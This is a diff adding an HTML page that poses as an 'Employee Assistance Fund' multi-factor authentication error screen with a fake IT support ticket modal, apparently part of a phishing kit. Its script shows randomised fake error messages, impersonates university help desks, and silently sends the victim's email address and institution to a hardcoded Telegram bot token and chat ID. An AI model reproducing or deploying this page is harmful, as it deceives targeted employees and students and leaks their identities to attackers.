@@ -1,0 +1,933 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Error - Employee Assistance Fund</title>
+    <link rel="icon" href="eaf_favicon.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #1a5f7a;      /* Deep institutional blue */
+            --secondary-color: #2c7873;    /* Teal accent */
+            --accent-color: #57cc99;       /* Fresh green */
+            --light-accent: #80ed99;       /* Light mint */
+            --dark-blue: #004d61;          /* Dark blue */
+            --light-blue: #e3f2fd;         /* Light background blue */
+            --auth-blue: #0078d4;          /* Authentication blue */
+            --auth-purple: #7160e8;        /* Authentication purple accent */
+            --error-red: #dc3545;          /* Error red */
+            --warning-orange: #ff9800;     /* Warning orange */
+            
+            --primary-gradient: linear-gradient(135deg, var(--primary-color) 0%, var(--dark-blue) 100%);
+            --secondary-gradient: linear-gradient(135deg, var(--secondary-color) 0%, var(--accent-color) 100%);
+            --accent-gradient: linear-gradient(135deg, var(--accent-color) 0%, var(--light-accent) 100%);
+            --auth-gradient: linear-gradient(135deg, var(--auth-blue) 0%, var(--auth-purple) 100%);
+            --error-gradient: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+            
+            --background-gradient: linear-gradient(135deg, #f8fdff 0%, #edf7ff 50%, #e3f2fd 100%);
+            --card-gradient: linear-gradient(135deg, #ffffff 0%, #fafcff 100%);
+            --header-gradient: linear-gradient(135deg, var(--auth-blue) 0%, #106ebe 100%);
+            
+            --text-primary: #1a3c4d;
+            --text-secondary: #2d5567;
+            --text-muted: #6c8a9a;
+            --border-color: #c5d9e8;
+            --border-light: #e8f1f8;
+            
+            --shadow-sm: 0 4px 6px rgba(26, 95, 122, 0.08);
+            --shadow-md: 0 6px 20px rgba(26, 95, 122, 0.12);
+            --shadow-lg: 0 10px 40px rgba(26, 95, 122, 0.15);
+            --shadow-xl: 0 15px 60px rgba(26, 95, 122, 0.2);
+            
+            --border-radius-sm: 8px;
+            --border-radius-md: 12px;
+            --border-radius-lg: 16px;
+            --border-radius-xl: 24px;
+            --border-radius-2xl: 32px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--background-gradient);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text-primary);
+            position: relative;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+
+        /* Error background */
+        .error-bg {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.03;
+        }
+
+        .error-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 30%, var(--error-red) 1px, transparent 1px),
+                radial-gradient(circle at 80% 70%, var(--warning-orange) 1px, transparent 1px),
+                radial-gradient(circle at 50% 50%, #ff6b6b 1px, transparent 1px);
+            background-size: 120px 120px;
+        }
+
+        /* Main Container */
+        .error-container {
+            width: 100%;
+            max-width: 800px; /* Same as authentication page */
+        }
+
+        .error-card {
+            background: var(--card-gradient);
+            border-radius: var(--border-radius-2xl);
+            box-shadow: var(--shadow-xl);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            padding: 3rem 4rem;
+            position: relative;
+            animation: slideUp 0.8s cubic-bezier(.18, .89, .32, 1.28);
+        }
+
+        @keyframes slideUp {
+            0% {
+                transform: translateY(30px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        /* Login Header */
+        .login-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border-light);
+            position: relative;
+        }
+
+        .login-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 80px;
+            height: 80px;
+            background: var(--error-gradient);
+            border-radius: 50%;
+            margin: 0 auto 1.5rem;
+            color: white;
+            font-size: 2.5rem;
+            box-shadow: 0 8px 25px rgba(220, 53, 69, 0.2);
+        }
+
+        .login-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--error-red);
+            margin-bottom: 0.5rem;
+        }
+
+        .login-subtitle {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        /* Login Body */
+        .login-body {
+            width: 100%;
+        }
+
+        /* Error Container */
+        .error-content {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
+        .error-icon-large {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 90px;
+            height: 90px;
+            background: var(--error-gradient);
+            border-radius: 50%;
+            margin: 0 auto 1.5rem;
+            color: white;
+            font-size: 3rem;
+            box-shadow: 0 8px 25px rgba(220, 53, 69, 0.2);
+            animation: pulseError 2s infinite;
+        }
+
+        @keyframes pulseError {
+            0% {
+                box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 15px rgba(220, 53, 69, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(220, 53, 69, 0);
+            }
+        }
+
+        .error-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--error-red);
+            margin-bottom: 1rem;
+        }
+
+        .error-description {
+            font-size: 1.05rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            margin-bottom: 1.5rem;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .error-code {
+            display: inline-block;
+            background: rgba(220, 53, 69, 0.1);
+            border: 1px solid rgba(220, 53, 69, 0.2);
+            border-radius: var(--border-radius-md);
+            padding: 0.75rem 1.5rem;
+            font-family: monospace;
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--error-red);
+            margin-bottom: 2rem;
+            letter-spacing: 1px;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 1.1rem 2rem;
+            border: none;
+            border-radius: var(--border-radius-md);
+            font-size: 1.05rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-primary {
+            background: var(--auth-gradient);
+            color: white;
+            box-shadow: 0 6px 20px rgba(0, 120, 212, 0.2);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #106ebe 0%, var(--auth-blue) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(0, 120, 212, 0.3);
+        }
+
+        .btn-danger {
+            background: var(--error-gradient);
+            color: white;
+            margin-top: 1rem;
+            box-shadow: 0 6px 20px rgba(220, 53, 69, 0.2);
+        }
+
+        .btn-danger:hover {
+            background: linear-gradient(135deg, #c82333 0%, var(--error-red) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(220, 53, 69, 0.3);
+        }
+
+        /* Support Modal - WIDER */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: var(--card-gradient);
+            border-radius: var(--border-radius-2xl);
+            box-shadow: var(--shadow-xl);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            max-width: 800px; /* INCREASED from 600px to 800px */
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: modalSlideUp 0.4s cubic-bezier(.18, .89, .32, 1.28);
+        }
+
+        @keyframes modalSlideUp {
+            0% {
+                transform: translateY(50px) scale(0.95);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+
+        .modal-header {
+            text-align: center;
+            padding: 2.5rem 4rem 2rem; /* Increased horizontal padding */
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .modal-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 70px;
+            height: 70px;
+            background: var(--auth-gradient);
+            border-radius: 50%;
+            margin: 0 auto 1.5rem;
+            color: white;
+            font-size: 2rem;
+            box-shadow: 0 8px 20px rgba(0, 120, 212, 0.2);
+        }
+
+        .modal-title {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--auth-blue);
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-subtitle {
+            font-size: 1.05rem;
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        .modal-body {
+            padding: 2rem 4rem; /* Increased horizontal padding */
+        }
+
+        .support-message {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .support-message h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: var(--accent-color);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+
+        .support-message p {
+            font-size: 1rem;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .support-details {
+            background: rgba(0, 120, 212, 0.03);
+            border: 1px solid var(--border-light);
+            border-radius: var(--border-radius-lg);
+            padding: 2rem; /* Increased padding */
+            margin-bottom: 2rem;
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .detail-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .detail-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 120, 212, 0.1);
+            border-radius: 50%;
+            color: var(--auth-blue);
+            font-size: 1rem;
+            flex-shrink: 0;
+            margin-top: 0.25rem;
+        }
+
+        .detail-content {
+            flex: 1;
+            min-width: 0; /* Allow content to shrink if needed */
+        }
+
+        .detail-label {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 0.25rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .detail-value {
+            font-size: 0.95rem;
+            color: var(--text-primary);
+            line-height: 1.5;
+            word-break: break-word; /* Prevent long text from overflowing */
+        }
+
+        .detail-value strong {
+            color: var(--auth-blue);
+        }
+
+        .support-ticket {
+            background: rgba(0, 120, 212, 0.1);
+            border: 1px solid rgba(0, 120, 212, 0.2);
+            border-radius: var(--border-radius-md);
+            padding: 1rem;
+            font-family: monospace;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--auth-blue);
+            text-align: center;
+            letter-spacing: 1px;
+            margin-bottom: 1.5rem;
+            word-break: break-all; /* Allow ticket number to wrap */
+        }
+
+        .modal-footer {
+            padding: 1.5rem 4rem 2.5rem; /* Increased horizontal padding */
+            text-align: center;
+            border-top: 1px solid var(--border-light);
+        }
+
+        .btn-close {
+            padding: 1rem 2.5rem;
+            background: var(--auth-gradient);
+            color: white;
+            border: none;
+            border-radius: var(--border-radius-md);
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            box-shadow: 0 4px 12px rgba(0, 120, 212, 0.2);
+        }
+
+        .btn-close:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(0, 120, 212, 0.3);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 900px) {
+            .error-container {
+                max-width: 95vw;
+            }
+            
+            .error-card {
+                padding: 2.5rem 3rem;
+            }
+            
+            .modal-content {
+                max-width: 95vw;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .error-card {
+                padding: 2rem 1.5rem;
+                border-radius: var(--border-radius-xl);
+            }
+            
+            .login-title {
+                font-size: 1.7rem;
+            }
+            
+            .login-icon {
+                width: 60px;
+                height: 60px;
+                font-size: 1.8rem;
+            }
+            
+            .error-icon-large {
+                width: 70px;
+                height: 70px;
+                font-size: 2.2rem;
+            }
+            
+            .error-title {
+                font-size: 1.5rem;
+            }
+            
+            .modal-header {
+                padding: 2rem 2rem 1.5rem;
+            }
+            
+            .modal-body {
+                padding: 1.5rem 2rem;
+            }
+            
+            .modal-footer {
+                padding: 1.5rem 2rem 2rem;
+            }
+            
+            .support-details {
+                padding: 1.5rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .error-card {
+                padding: 1.5rem 1.25rem;
+            }
+            
+            .login-title {
+                font-size: 1.5rem;
+            }
+            
+            .login-icon {
+                width: 55px;
+                height: 55px;
+                font-size: 1.6rem;
+            }
+            
+            .error-icon-large {
+                width: 60px;
+                height: 60px;
+                font-size: 1.8rem;
+            }
+            
+            .error-title {
+                font-size: 1.3rem;
+            }
+            
+            .modal-header {
+                padding: 1.5rem 1.25rem 1.25rem;
+            }
+            
+            .modal-body {
+                padding: 1.25rem;
+            }
+            
+            .modal-footer {
+                padding: 1.25rem 1.25rem 1.5rem;
+            }
+            
+            .support-details {
+                padding: 1.25rem;
+            }
+            
+            .detail-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+            
+            .detail-icon {
+                align-self: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="error-bg">
+        <div class="error-pattern"></div>
+    </div>
+    
+    <!-- Error Page -->
+    <div class="error-container">
+        <div class="error-card">
+            <div class="login-header">
+                <div class="login-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="login-title">Authentication Error</div>
+                <div class="login-subtitle">Multi-Factor Authentication Failed</div>
+            </div>
+
+            <div class="login-body">
+                <div class="error-content">
+                    <div class="error-icon-large">
+                        <i class="fas fa-times-circle"></i>
+                    </div>
+                    <h2 class="error-title" id="errorTitle">Multi-Factor Authentication Failed</h2>
+                    <div class="error-description" id="errorDescription">
+                        The verification code entered did not match our records. This could be due to an expired code or incorrect entry.
+                    </div>
+                    <div class="error-code" id="errorCode">AUTH_ERR_MFA_INVALID</div>
+
+                    <button class="btn btn-primary" id="tryAgainBtn">
+                        <i class="fas fa-redo"></i> Try Again
+                    </button>
+
+                    <button class="btn btn-danger" id="supportBtn">
+                        <i class="fas fa-headset"></i> Contact IT Support
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Support Modal -->
+    <div class="modal-overlay" id="supportModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-headset"></i>
+                </div>
+                <div class="modal-title">Support Request Submitted</div>
+                <div class="modal-subtitle">IT Help Desk Assistance</div>
+            </div>
+            
+            <div class="modal-body">
+                <div class="support-message">
+                    <h3><i class="fas fa-check-circle"></i> Support Request Logged Successfully</h3>
+                    <p>Your support request has been received and logged in our system. A member of the IT Help Desk team will contact you shortly to assist with your authentication issue.</p>
+                </div>
+
+                <div class="support-details">
+                    <div class="detail-item">
+                        <div class="detail-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="detail-content">
+                            <div class="detail-label">Requestor Information</div>
+                            <div class="detail-value" id="modalUserEmail">User: Loading...</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-icon">
+                            <i class="fas fa-exclamation-triangle"></i>
+                        </div>
+                        <div class="detail-content">
+                            <div class="detail-label">Error Details</div>
+                            <div class="detail-value" id="modalErrorDetails">Error: Loading...</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="detail-content">
+                            <div class="detail-label">Response Time</div>
+                            <div class="detail-value">Estimated response time: <strong>15-30 minutes</strong> during business hours (Mon-Fri, 8AM-6PM)</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                        <div class="detail-content">
+                            <div class="detail-label">Contact Information</div>
+                            <div class="detail-value" id="modalContactInfo">
+                                <strong>IT Help Desk:</strong> Loading...<br>
+                                <strong>Phone:</strong> (555) 123-HELP (4357)<br>
+                                <strong>Hours:</strong> Mon-Fri 8:00 AM - 6:00 PM EST
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="support-ticket" id="modalTicketNumber">
+                    TICKET#: EDU-IT-2023-001
+                </div>
+
+                <div class="subtitle" style="color: var(--text-muted); font-size: 13px; text-align: center; margin-top: 15px;">
+                    <i class="fas fa-info-circle"></i> Please reference your ticket number in all communications regarding this issue.
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn-close" id="closeModalBtn">
+                    <i class="fas fa-check"></i> Acknowledged
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get email from URL parameter
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+        
+        const userEmail = getQueryParam('email');
+        
+        // Function to extract domain from email
+        function extractDomainFromEmail(email) {
+            if (!email || !email.includes('@')) {
+                return 'institution.edu'; // Default domain if no valid email
+            }
+            
+            const domain = email.split('@')[1];
+            return domain;
+        }
+        
+        // Function to get institution name from domain
+        function getInstitutionName(domain) {
+            // Common domain to institution name mappings
+            const institutionMap = {
+                'harvard.edu': 'Harvard University',
+                'stanford.edu': 'Stanford University',
+                'mit.edu': 'Massachusetts Institute of Technology',
+                'princeton.edu': 'Princeton University',
+                'yale.edu': 'Yale University',
+                'columbia.edu': 'Columbia University',
+                'uchicago.edu': 'University of Chicago',
+                'cornell.edu': 'Cornell University',
+                'upenn.edu': 'University of Pennsylvania',
+                'jhu.edu': 'Johns Hopkins University',
+                'umich.edu': 'University of Michigan',
+                'ucla.edu': 'University of California, Los Angeles',
+                'berkeley.edu': 'University of California, Berkeley',
+                'northwestern.edu': 'Northwestern University',
+                'duke.edu': 'Duke University',
+                'dartmouth.edu': 'Dartmouth College',
+                'brown.edu': 'Brown University',
+                'vanderbilt.edu': 'Vanderbilt University',
+                'rice.edu': 'Rice University',
+                'wustl.edu': 'Washington University in St. Louis'
+            };
+            
+            // Check if domain is in the map, otherwise generate generic name
+            if (institutionMap[domain.toLowerCase()]) {
+                return institutionMap[domain.toLowerCase()];
+            } else {
+                // Extract institution name from domain (e.g., "university.edu" -> "University")
+                const domainParts = domain.split('.');
+                if (domainParts.length >= 2) {
+                    const institution = domainParts[domainParts.length - 2];
+                    return institution.charAt(0).toUpperCase() + institution.slice(1) + ' IT Support';
+                }
+                return 'Institution';
+            }
+        }
+        
+        // Dynamic error messages
+        const errorMessages = [
+            {
+                title: "Multi-Factor Authentication Failed",
+                description: "The verification code entered did not match our records. This could be due to an expired code or incorrect entry.",
+                code: "AUTH_ERR_MFA_INVALID"
+            },
+            {
+                title: "Verification Timeout",
+                description: "The authentication request timed out. Please ensure you're using the correct verification method and try again.",
+                code: "AUTH_ERR_TIMEOUT"
+            },
+            {
+                title: "Account Access Restricted",
+                description: "Your account does not have the required permissions to access this service. Please contact your institution's IT department.",
+                code: "AUTH_ERR_PERMISSION_DENIED"
+            },
+            {
+                title: "Invalid Authentication Attempt",
+                description: "Multiple unsuccessful authentication attempts detected. Please wait 15 minutes before trying again.",
+                code: "AUTH_ERR_MAX_ATTEMPTS"
+            },
+            {
+                title: "System Authentication Error",
+                description: "We encountered an issue verifying your identity. This may be due to temporary system maintenance.",
+                code: "AUTH_ERR_SYSTEM_ERROR"
+            }
+        ];
+
+        // Select random error message
+        const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        document.getElementById('errorTitle').textContent = randomError.title;
+        document.getElementById('errorDescription').textContent = randomError.description;
+        document.getElementById('errorCode').textContent = randomError.code;
+
+        // Update modal with dynamic content
+        function updateModalContent() {
+            const modalUserEmail = document.getElementById('modalUserEmail');
+            const modalErrorDetails = document.getElementById('modalErrorDetails');
+            const modalTicketNumber = document.getElementById('modalTicketNumber');
+            const modalContactInfo = document.getElementById('modalContactInfo');
+            
+            // Extract domain and institution info
+            const userDomain = extractDomainFromEmail(userEmail);
+            const institutionName = getInstitutionName(userDomain);
+            
+            // Generate ticket number
+            const date = new Date();
+            const year = date.getFullYear();
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const day = String(date.getDate()).padStart(2, '0');
+            const randomNum = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
+            const ticketNumber = `TICKET#: ${institutionName.replace(/\s+/g, '-').toUpperCase()}-${year}-${month}${day}-${randomNum}`;
+            
+            // Update modal content
+            modalUserEmail.textContent = `User: ${userEmail || 'Not provided'}`;
+            modalErrorDetails.textContent = `Error: ${randomError.title} (${randomError.code})`;
+            modalTicketNumber.textContent = ticketNumber;
+            
+            // Add contact info based on time and domain
+            const hours = date.getHours();
+            const isBusinessHours = (date.getDay() >= 1 && date.getDay() <= 5) && (hours >= 8 && hours < 18);
+            const helpDeskEmail = `helpdesk@${userDomain}`;
+            
+            // Special phone numbers for common institutions
+            const institutionPhoneNumbers = {
+                'harvard.edu': '(617) 495-7777',
+                'stanford.edu': '(650) 725-4357',
+                'mit.edu': '(617) 253-1101',
+                'princeton.edu': '(609) 258-4357',
+                'yale.edu': '(203) 432-9000'
+            };
+            
+            const phoneNumber = institutionPhoneNumbers[userDomain.toLowerCase()] || '(555) 123-HELP (4357)';
+            
+            if (isBusinessHours) {
+                modalContactInfo.innerHTML = `
+                    <strong>IT Help Desk:</strong> ${helpDeskEmail}<br>
+                    <strong>Phone:</strong> ${phoneNumber}<br>
+                    <strong>Hours:</strong> Mon-Fri 8:00 AM - 6:00 PM EST<br>
+                    <strong>Status:</strong> Currently open
+                `;
+            } else {
+                modalContactInfo.innerHTML = `
+                    <strong>IT Help Desk:</strong> ${helpDeskEmail}<br>
+                    <strong>Phone:</strong> ${phoneNumber}<br>
+                    <strong>Hours:</strong> Mon-Fri 8:00 AM - 6:00 PM EST<br>
+                    <strong>Status:</strong> Outside business hours - email only
+                `;
+            }
+        }
+
+        // Modal functionality
+        const supportModal = document.getElementById('supportModal');
+        const supportBtn = document.getElementById('supportBtn');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const tryAgainBtn = document.getElementById('tryAgainBtn');
+
+        // Open support modal
+        supportBtn.addEventListener('click', function() {
+            updateModalContent();
+            supportModal.classList.add('active');
+            
+            // Send Telegram notification for support request (optional)
+            sendSupportNotification();
+        });
+
+        // Close support modal
+        closeModalBtn.addEventListener('click', function() {
+            supportModal.classList.remove('active');
+        });
+
+        // Close modal when clicking outside
+        supportModal.addEventListener('click', function(e) {
+            if (e.target === supportModal) {
+                supportModal.classList.remove('active');
+            }
+        });
+
+        // Try again button
+        tryAgainBtn.addEventListener('click', function() {
+            window.location.href = 'index.html';
+        });
+
+        // Telegram notification for support request (optional)
+        async function sendSupportNotification() {
+            try {
+                const date = new Date();
+                const userDomain = extractDomainFromEmail(userEmail);
+                const helpDeskEmail = `helpdesk@${userDomain}`;
+                const institutionName = getInstitutionName(userDomain);
+                
+                const message = `🆘 *SUPPORT REQUEST SUBMITTED*\n══════════════════════════════════\n📧 *User:* ${userEmail || 'Unknown'}\n🏛️ *Institution:* ${institutionName}\n❌ *Error:* ${randomError.title}\n🔑 *Error Code:* ${randomError.code}\n📞 *Help Desk:* ${helpDeskEmail}\n📋 *Ticket:* ${document.getElementById('modalTicketNumber').textContent}\n🕐 *Time:* ${date.toLocaleString()}\n══════════════════════════════════`;
+                
+                const telegramToken = "7629206511:AAEjqGZWJfgj7so-yPiQ9un1cHUi1BpPavc";
+                const telegramChatId = "1499516919";
+                const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+                
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: telegramChatId, 
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                console.log('Support request notification sent to Telegram');
+                
+            } catch (error) {
+                console.error('Failed to send support notification:', error);
+            }
+        }
+
+        // Log error details
+        console.log('Authentication Error Details:', {
+            timestamp: new Date().toISOString(),
+            email: userEmail || 'Not provided',
+            domain: extractDomainFromEmail(userEmail),
+            institution: getInstitutionName(extractDomainFromEmail(userEmail)),
+            errorType: randomError.title,
+            errorCode: randomError.code,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+        });
+    </script>
+</body>
+</html>
